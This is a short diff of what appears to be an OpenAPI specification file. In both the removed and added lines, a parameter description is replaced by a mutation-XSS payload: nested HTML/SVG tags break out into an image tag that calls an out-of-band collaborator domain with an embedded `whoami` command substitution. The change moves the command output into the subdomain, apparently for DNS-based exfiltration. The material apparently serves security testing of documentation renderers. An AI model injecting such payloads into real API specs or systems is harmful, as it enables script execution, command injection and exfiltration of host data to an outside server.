@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=https://njax4rt10o74pm8oek0kpyf6hxnnbc.oastify.com?`whoami`>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=https://`whoami`.njax4rt10o74pm8oek0kpyf6hxnnbc.oastify.com>"></form>
 
           format: int64
           in: path
